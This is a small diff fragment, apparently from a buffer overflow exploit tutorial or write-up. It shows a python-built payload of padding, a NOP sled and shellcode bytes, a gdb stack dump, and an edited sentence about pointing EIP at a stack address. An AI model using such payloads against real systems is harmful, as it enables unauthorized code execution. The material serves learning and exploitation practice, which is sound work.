@@ -189,7 +189,7 @@ run $(python -c 'print "\x41"*1896 + "\x90"*100 + "H\xb8\x01\x01\x01\x01\x01\x01
     0xffffd75c:	0x01010101b8489090	0x60b8485001010101
     0xffffd76c:	0x4801017579752f66	0x6f722fb848240431
 
-Now all we need to do is point EIP to 0xffffd75c:
+Now all we need to do is point EIP to: 0xffffd75c
 
 
 
